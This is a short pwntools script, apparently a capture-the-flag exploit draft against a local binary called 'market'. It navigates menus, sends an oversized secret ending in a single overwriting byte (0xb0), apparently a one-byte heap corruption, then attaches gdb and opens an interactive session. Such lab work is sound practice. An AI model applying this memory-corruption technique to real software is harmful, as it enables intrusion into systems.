#!/usr/bin/python3

from pwn import *

r = process('./market')

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r.sendlineafter('need', 'n')
r.sendlineafter('name', 'A')
r.sendlineafter('long', str(0x280))
r.sendafter('secret', b'A'*0x80 + b'\xb0')
gdb.attach(r)

r.sendlineafter("> ", "4")
r.sendlineafter('name', 'A')
r.sendlineafter('long', str(0x10))
r.sendafter('secret', b'A'*0x10)

r.interactive()
